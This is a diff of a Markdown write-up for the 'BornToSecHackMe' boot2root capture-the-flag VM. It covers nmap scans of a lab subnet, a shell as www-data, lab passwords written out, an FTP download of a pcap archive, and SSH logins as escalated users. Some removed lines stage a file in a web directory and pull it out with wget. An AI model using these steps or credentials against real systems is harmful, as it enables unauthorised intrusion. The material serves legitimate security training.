@@ -1,4 +1,79 @@
-### Fill this later
+# How to find the IP of the VM ?
+
+We know that the VM is connected through the network interface `enp0s31f6`.
+
+```
+nlederge@k0r3p13:~ $ ip a         
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: enp0s31f6: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
+    link/ether d0:46:0c:85:a3:95 brd ff:ff:ff:ff:ff:ff
+    inet 10.11.3.13/16 brd 10.11.255.255 scope global dynamic noprefixroute enp0s31f6
+       valid_lft 4253sec preferred_lft 4253sec
+    inet6 fe80::baef:a725:fbe8:c5dc/64 scope link noprefixroute 
+       valid_lft forever preferred_lft forever
+3: wlp0s20f3: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default qlen 1000
+    link/ether a8:59:5f:cb:72:99 brd ff:ff:ff:ff:ff:ff
+4: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
+    link/ether 12:8b:77:1a:96:9e brd ff:ff:ff:ff:ff:ff
+    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
+       valid_lft forever preferred_lft forever
+5: vboxnet0: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000
+    link/ether 0a:00:27:00:00:00 brd ff:ff:ff:ff:ff:ff
+```
+
+The IP of the VM will be in the subnet `10.11.3.13/16`. We could scan with nmap the entire subnet to find the VM but we know that VirtualBox machines usually take an IP at the end of the subnet.
+
+```
+nlederge@k0r3p13:~ $ nmap -sn 10.11.250-254.0-254
+Starting Nmap 7.98 ( https://nmap.org ) at 2025-10-15 11:51 +0200
+Nmap scan report for 10.11.250.230
+Host is up (0.00030s latency).
+Nmap scan report for 10.11.250.250
+Host is up (0.0041s latency).
+Nmap scan report for _gateway (10.11.254.254)
+Host is up (0.00038s latency).
+Nmap done: 1275 IP addresses (3 hosts up) scanned in 33.16 seconds
+```
+
+We have two potential candidates: `10.11.250.230` and `10.11.250.250`. Let's see which ports are open.
+
+```
+nlederge@k0r3p13:~ $ nmap 10.11.250.230 10.11.250.250
+Starting Nmap 7.98 ( https://nmap.org ) at 2025-10-15 11:53 +0200
+Nmap scan report for 10.11.250.230
+Host is up (0.000027s latency).
+Not shown: 994 closed tcp ports (conn-refused)
+PORT    STATE SERVICE
+21/tcp  open  ftp
+22/tcp  open  ssh
+80/tcp  open  http
+143/tcp open  imap
+443/tcp open  https
+993/tcp open  imaps
+
+Nmap scan report for 10.11.250.250
+Host is up (0.0019s latency).
+Not shown: 993 closed tcp ports (conn-refused)
+PORT     STATE SERVICE
+4321/tcp open  rwhois
+7000/tcp open  afs3-fileserver
+7100/tcp open  font-service
+7435/tcp open  unknown
+8008/tcp open  http
+8009/tcp open  ajp13
+8080/tcp open  http-proxy
+
+Nmap done: 2 IP addresses (2 hosts up) scanned in 1.06 seconds
+```
+
+By opening the `10.11.250.230` in a browser, we can see that it is a web server asking to hack it, confirming our hypothesis.
+
+# Getting a shell on the server
 
 With `gobuster` we can try to find directories and files on the server.
 
@@ -168,6 +243,8 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 www-data@BornToSecHackMe:/var/www/forum/templates_c$
 ```
 
+# Following the breadcrumbs
+
 In the directory `/home`, there is a directory `LOOKATME` which contains a file password.
 
 ```
@@ -185,18 +262,90 @@ uid=1001(lmezard) gid=1001(lmezard) groups=1001(lmezard)
 lmezard@BornToSecHackMe:~$
 ```
 
-In the home directory there is a `README` file which contains this text referencing the file `fun`. It is an archive containing a lot of `pcap` files each containing part of a `c` program. Since we can't `scp` to our machine directly, we need to find another way.
+## lmezard's fun
+
+In the home directory there is a `README` file which contains this text referencing the file `fun`.
 
 ```
-lmezard@BornToSecHackMe:~$ cp fun /tmp/fun
-lmezard@BornToSecHackMe:~$ chmod 777 /tmp/fun
-lmezard@BornToSecHackMe:~$ exit
-exit
-www-data@BornToSecHackMe:/home$ cp /tmp/fun /var/www/forum/templates_c/fun
+lmezard@BornToSecHackMe:~$ cat README 
+Complete this little challenge and use the result as password for user 'laurie' to login in ssh
 ```
 
-Then on our machine, we can get the file `fun` from the website.
+It is an archive containing a lot of `pcap` files each containing part of a `c` program. Since we can't `scp` to our machine directly, we need to find another way. We can use the `ftp` service with the credentials `lmezard` : `G!@M6f4Eatau{sF"` to download the file `fun`.
 
-```sh
-wget https://10.11.250.230/forum/templates_c/fun --no-check-certificate
 ```
+nlederge@k0r3p13:work/42adv_boot2root ‹main*›$ ftp 10.11.250.230
+Connected to 10.11.250.230.
+220 Welcome on this server
+Name (10.11.250.230:nlederge): lmezard
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+229 Entering Extended Passive Mode (|||6216|).
+150 Here comes the directory listing.
+-rwxr-x---    1 1001     1001           96 Oct 15  2015 README
+-rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun
+226 Directory send OK.
+ftp> get fun
+local: fun remote: fun
+229 Entering Extended Passive Mode (|||59534|).
+150 Opening BINARY mode data connection for fun (808960 bytes).
+100% |***********************************|   790 KiB  163.41 MiB/s    00:00 ETA
+226 Transfer complete.
+808960 bytes received in 00:00 (153.40 MiB/s)
+ftp> exit
+221 Goodbye.
+```
+
+We can then unpack the file `fun` and see the `pcap` files.
+
+```
+nlederge@k0r3p13:work/42adv_boot2root ‹main*›$ tar -xvf fun     
+ft_fun/
+ft_fun/C4D03.pcap
+ft_fun/GKGEP.pcap
+ft_fun/A5GPY.pcap
+ft_fun/K8SEB.pcap
+ft_fun/PFG98.pcap
+ft_fun/U89WD.pcap
+...
+```
+
+Each `pcap` file contains part of a `c` program. We can concatenate them all to get the complete program following the comments indicating the order of the files, i.e. `//file443`.
+For this, we will use our script `concatenate_fun.py`, compile the program and run it to get the password.
+
+```
+nlederge@k0r3p13:work/42adv_boot2root ‹main*›$ python3 scripts/concatenate_fun.py
+nlederge@k0r3p13:work/42adv_boot2root ‹main*›$ cc combined_fun.c && ./a.out
+MY PASSWORD IS: Iheartpwnage
+Now SHA-256 it and submit%
+```
+
+It asks us to SHA-256 the password before submitting it.
+
+```
+nlederge@k0r3p13:work/42adv_boot2root ‹main*›$ echo -n Iheartpwnage | sha256sum 
+330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4  -
+```
+
+Now we can ssh to `laurie` with the password `330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4`.
+
+```
+nlederge@k0r3p13:work/42adv_boot2root ‹main*›$ ssh laurie@10.11.250.230
+        ____                _______    _____           
+       |  _ \              |__   __|  / ____|          
+       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___ 
+       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
+       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__ 
+       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|
+
+                       Good luck & Have fun
+laurie@10.11.250.230's password: 
+laurie@BornToSecHackMe:~$ id
+uid=1003(laurie) gid=1003(laurie) groups=1003(laurie)
+```
+
+## laurie's bomb
